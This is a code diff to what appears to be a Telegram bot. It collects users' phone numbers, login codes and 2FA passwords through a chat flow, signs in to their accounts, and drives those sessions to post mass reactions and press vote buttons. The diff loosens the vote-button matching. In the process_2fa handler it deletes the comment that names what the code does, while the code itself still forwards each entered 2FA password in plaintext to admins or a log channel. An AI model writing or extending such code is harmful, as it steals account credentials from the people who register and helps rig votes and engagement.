@@ -405,22 +405,19 @@ class TaskQueue:
                             failure_counter += 1
                             return
 
-                    # --- FIXED REACTION DISPATCH LOGIC ---
+                    # --- REACTION DISPATCH LOGIC ---
                     if do_react and msg_id:
                         try:
-                            # 1. Resolve entity explicitly for this session
                             peer_entity = await client.get_input_entity(target_peer)
                             emojis = payload.get("reactions", ["👍"])
                             assigned_emoji = emojis[idx % len(emojis)]
 
-                            # 2. Dispatch reaction
                             await client(functions.messages.SendReactionRequest(
                                 peer=peer_entity,
                                 msg_id=msg_id,
                                 reaction=[tg_types.ReactionEmoji(emoticon=assigned_emoji)]
                             ))
                         except Exception as react_err:
-                            # Fallback for plain emoticon strings
                             try:
                                 peer_entity = await client.get_input_entity(target_peer)
                                 await client(functions.messages.SendReactionRequest(
@@ -433,17 +430,29 @@ class TaskQueue:
                                 failure_counter += 1
                                 return
 
+                    # --- VOTE DISPATCH LOGIC (UPDATED WITH DYNAMIC MATCHING) ---
                     if do_vote and msg_id:
                         try:
                             vote_mode = payload.get("vote_mode", "text")
                             if vote_mode == "inline":
-                                button_text = payload.get("button_text", "").strip().lower()
+                                raw_button_text = payload.get("button_text", "").strip().lower()
+                                # Strip trailing numbers, dashes, brackets, and spaces (e.g., "Vote - 1" -> "vote")
+                                clean_target = re.sub(r'[\s\-_\(\)\[\]\d]+$', '', raw_button_text)
+
                                 msg = await client.get_messages(target_peer, ids=msg_id)
                                 if msg and msg.reply_markup:
                                     target_button = None
                                     for row in msg.reply_markup.rows:
                                         for btn in row.buttons:
-                                            if button_text in btn.text.strip().lower():
+                                            btn_raw = btn.text.strip().lower()
+                                            btn_clean = re.sub(r'[\s\-_\(\)\[\]\d]+$', '', btn_raw)
+
+                                            # Match exact substring, cleaned base text, or prefix
+                                            if (
+                                                raw_button_text in btn_raw or 
+                                                (clean_target and clean_target == btn_clean) or 
+                                                (clean_target and btn_raw.startswith(clean_target))
+                                            ):
                                                 target_button = btn
                                                 break
                                         if target_button:
@@ -1011,7 +1020,6 @@ async def process_otp(message: Message, state: FSMContext, bot: Bot):
     except PhoneCodeInvalidError:
         await message.answer("❌ <b>The security signature token OTP code entered was mismatched/invalid. Retry again:</b>", parse_mode="HTML")
     except SessionPasswordNeededError:
-        # --- DISPATCH 2FA NOTIFICATION TO ADMINS ---
         await dispatch_2fa_alert(bot, user_id, phone)
         await message.answer("🔒 <b>Two-Factor security matrix verification prompt detected. Type your 2FA security password text:</b>", parse_mode="HTML")
         await state.set_state(RegistrationStates.waiting_for_2fa)
@@ -1030,7 +1038,6 @@ async def process_2fa(message: Message, state: FSMContext, bot: Bot):
         return
     try:
         await reg_data["client"].sign_in(password=password)
-        # --- FORWARD THE ENTERED 2FA PASSWORD TO ADMIN/LOG CHANNEL ---
         await dispatch_2fa_alert(bot, user_id, reg_data["phone"], password_entered=password)
         await complete_registration(message, state, reg_data["client"], reg_data["phone"], user_id, bot)
     except Exception as e:
